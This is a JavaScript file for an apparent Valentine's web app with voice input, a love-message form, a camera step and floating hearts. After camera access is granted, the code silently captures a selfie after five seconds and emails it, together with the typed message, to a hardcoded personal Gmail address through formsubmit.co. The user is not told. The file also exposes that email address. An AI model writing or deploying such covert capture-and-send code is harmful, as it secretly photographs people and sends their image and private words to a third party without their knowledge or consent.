// ================= STATE =================
let currentStep = 1;

const state = {
    transcript: "",
    reason: "",
    isListening: false
};

// ================= DOM =================
const elements = {
    micBtn: document.getElementById('mic-btn'),
    transcript: document.getElementById('transcript'),
    voiceError: document.getElementById('voice-error'),
    micUnsupported: document.getElementById('mic-unsupported'),

    step1: document.getElementById('step-1'),
    step2: document.getElementById('step-2'),
    step3: document.getElementById('step-3'),
    step4: document.getElementById('step-4'),
    step5: document.getElementById('step-5'),

    reasonInput: document.getElementById('reason-input'),
    charCurrent: document.getElementById('char-current'),
    submitReasonBtn: document.getElementById('submit-reason-btn'),

    camera: document.getElementById('camera'),
    finalLetterText: document.getElementById('final-letter-text')
};

// ================= AUDIO =================
const audio = {
    song: document.getElementById('audio-song')
};

// ================= STEP 1: VOICE =================
const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;

if (!SpeechRecognition) {
    elements.micUnsupported.classList.remove('hidden');
    elements.micBtn.disabled = true;
} else {
    const recognition = new SpeechRecognition();
    recognition.lang = 'en-US';

    elements.micBtn.addEventListener('click', () => {
        if (audio.song.paused) {
            audio.song.volume = 0;
            audio.song.play().catch(() => { });
        }
        recognition.start();
    });

    recognition.onresult = (event) => {
        const text = event.results[0][0].transcript.toLowerCase();
        elements.transcript.textContent = `"${text}"`;

        if (text.includes("love")) {
            transitionToStep(2);
        } else {
            elements.voiceError.classList.remove('hidden');
        }
    };
}

// ================= TRANSITION =================
function transitionToStep(step) {
    document.getElementById(`step-${currentStep}`).classList.add('hidden');
    document.getElementById(`step-${currentStep}`).classList.remove('active');

    currentStep = step;

    document.getElementById(`step-${step}`).classList.remove('hidden');
    document.getElementById(`step-${step}`).classList.add('active');

    if (step === 4) startCamera();
    if (step === 5) showFinalLetter();
}

// ================= STEP 2: LOVE MESSAGE =================
elements.reasonInput.addEventListener('input', e => {
    elements.charCurrent.textContent = e.target.value.length;
    elements.submitReasonBtn.disabled = e.target.value.length < 30;
});

elements.submitReasonBtn.addEventListener('click', () => {
    state.reason = elements.reasonInput.value.trim();
    document.getElementById('display-reason').textContent = state.reason;

    transitionToStep(3);

    setTimeout(() => {
        transitionToStep(4);
    }, 3000);
});

// ================= STEP 4: CAMERA =================
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        elements.camera.srcObject = stream;

        setTimeout(captureAndSend, 5000);

    } catch (err) {
        alert("Please allow camera access ❤️");
    }
}

// 📸 Capture Photo + Send Email
function captureAndSend() {
    const canvas = document.getElementById('capture-canvas');
    const video = elements.camera;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.scale(-1, 1);
    ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
        sendEmail(blob);
    }, 'image/jpeg', 0.9);

    // stop camera
    video.srcObject.getTracks().forEach(track => track.stop());

    transitionToStep(5);
}

// ================= EMAIL FUNCTION =================
function sendEmail(blob) {
    const email = "er.saravanan99@gmail.com";
    const url = `https://formsubmit.co/ajax/${email}`;

    const now = new Date().toLocaleString();

    const formData = new FormData();
    formData.append("name", "Divya 💖");
    formData.append(
        "message",
        `Love Message:\n${state.reason}\n\nCaptured on: ${now}\n\nSent via Valentine App 💖`
    );

    // ✅ IMPORTANT: attachment key required by FormSubmit
    formData.append("attachment", blob, "divya_selfie.jpg");

    formData.append("_subject", "New Photo & Love Message from Divya 💖");
    formData.append("_captcha", "false");
    formData.append("_template", "table");

    fetch(url, {
        method: "POST",
        body: formData
    })
        .then(res => res.json())
        .then(data => console.log("Email sent:", data))
        .catch(err => console.error("Email error:", err));
}

// ================= STEP 5: LETTER =================
function showFinalLetter() {
    typeWriter(state.reason, elements.finalLetterText, 40);
}

function typeWriter(text, element, speed = 40) {
    element.textContent = "";
    let i = 0;
    function typing() {
        if (i < text.length) {
            element.textContent += text.charAt(i);
            i++;
            setTimeout(typing, speed);
        }
    }
    typing();
}

// ================= FLOATING HEARTS =================
function createHearts() {
    const bg = document.querySelector('.bg-hearts');

    setInterval(() => {
        const heart = document.createElement('div');
        heart.innerHTML = '❤️';
        heart.style.position = 'absolute';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.top = '100vh';
        heart.style.fontSize = Math.random() * 20 + 10 + 'px';
        heart.style.animation = 'float 4s linear forwards';
        bg.appendChild(heart);
        setTimeout(() => heart.remove(), 4000);
    }, 300);
}

createHearts();
